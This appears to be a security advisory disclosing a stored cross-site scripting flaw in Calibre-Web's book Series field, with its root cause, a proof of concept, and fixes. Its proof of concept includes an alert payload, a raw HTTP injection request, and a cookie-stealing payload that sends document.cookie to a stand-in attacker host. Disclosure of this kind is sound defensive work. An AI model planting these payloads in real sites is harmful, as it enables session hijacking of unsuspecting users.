# Stored Cross-Site Scripting (XSS) via Book Series Name in Calibre-Web

| Field | Value |
|-------|-------|
| **CWE** | CWE-79 |
| **CVSS** | 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |

---

## Summary

An authenticated user with book-editing privileges can inject arbitrary JavaScript into the **Series** metadata field when editing a book. The payload is stored in the database without any sanitization. When any user visits the basic book detail view at `/basic_book/<id>`, the template renders the series name using `{{ series[0].name | safe }}`, which disables Jinja2's auto-escaping — causing the stored script to execute in the victim's browser.

Notably, the standard view at `/book/<id>` renders the same data safely using the `escapedlink()` macro. This confirms the vulnerability is a **code defect** (inconsistent output encoding), not a design decision.

---

## Root Cause

Two flaws combine to create this vulnerability:

### 1. Missing server-side input sanitization (write path)

**File:** `cps/editbooks.py`

```python
book.series = request.form.get('series')   # raw HTML stored directly — no sanitization
```

### 2. Unsafe template rendering (read path)

**File:** `cps/templates/basic_detail.html` (line 34)

```html
<!-- VULNERABLE: |safe disables Jinja2 auto-escaping -->
<p>Book {{ series[0].series_index | int }} of {{ series[0].name | safe }}</p>
```

**Safe counterpart** — `cps/templates/detail.html` (line 158):

```html
<!-- SAFE: escapedlink macro uses Python escape() function -->
{{ series | escapedlink(...) }}
```

| Endpoint | Template | Rendering Method | Vulnerable? |
|----------|----------|-----------------|-------------|
| `/basic_book/<id>` | `basic_detail.html:34` | `{{ series[0].name \| safe }}` | **Yes** |
| `/book/<id>` | `detail.html:158` | `escapedlink()` with `escape()` | No |

---

## Proof of Concept

### Step 1 — Login with an account that has Edit permission

Navigate to `http://TARGET:8083/login` and authenticate. Any user with **Edit** permission can perform this attack — administrator privileges are **not** required.

### Step 2 — Open the Book Edit form

Click on any book → click the **Edit** button (pencil icon). The URL changes to `http://TARGET:8083/admin/book/<book_id>`. The edit form displays fields: Title, Authors, Tags, Series, etc.

### Step 3 — Inject XSS payload into the Series field

Locate the **"Series"** field on the edit form. Enter the following payload:

```html
<img src=x onerror="alert('XSS')">
```

Click **Submit**.

**Alternative (via Burp Suite):** Intercept the POST request and replace the `series` parameter:

```http
POST /admin/book/2 HTTP/1.1
Host: localhost:8083
Content-Type: application/x-www-form-urlencoded
Cookie: session=<SESSION_COOKIE>

book_title=Some+Book&authors=Author&series=%3Cimg+src%3Dx+onerror%3D%22alert('XSS')%22%3E&series_index=1
```

Server responds **200 OK** — payload stored in the database without sanitization.

<img width="1819" height="839" alt="image" src="https://github.com/user-attachments/assets/31ded6ae-a028-4d84-8c37-3a7ba8c71f6c" />


### Step 4 — Trigger XSS as victim

Open a different browser with another account. Navigate to the vulnerable endpoint:

```
http://localhost:8083/basic_book/2
```

> **Critical:** The URL must be `/basic_book/2`, **NOT** `/book/2`.

**Result:** An alert dialog pops up displaying "XSS" — JavaScript executed in the victim's browser context. The page shows "Book 1 of" with the broken image element, and the alert dialog from `localhost:8083` confirms code execution.

<img width="1496" height="848" alt="image" src="https://github.com/user-attachments/assets/545e1e42-0abe-445c-b393-d6525f3909f3" />


### Step 5 — Cookie exfiltration (real-world impact)

Replace `alert()` with an exfiltration payload:

```html
<img src=x onerror="fetch('https://ATTACKER.oastify.com/?c='+document.cookie)">
```

When any victim visits `/basic_book/2`, their session cookie is silently sent to the attacker's server. The attacker can then hijack the victim's authenticated session.

---

## Suggested Fix

### 1. Remove `| safe` filter from `basic_detail.html` line 34

Use the same `escapedlink` macro already used in `detail.html`:

```html
<!-- Before (vulnerable): -->
<p>Book {{ series[0].series_index | int }} of {{ series[0].name | safe }}</p>

<!-- After (fixed): -->
<p>Book {{ series[0].series_index | int }} of {{ series[0].name }}</p>
<!-- Or use the escapedlink macro for consistency with detail.html -->
```

### 2. Server-side input sanitization

Strip or encode HTML in all metadata fields before database write.

### 3. Audit all `| safe` usages

Search the entire template directory for other `| safe` instances that may introduce similar vulnerabilities.
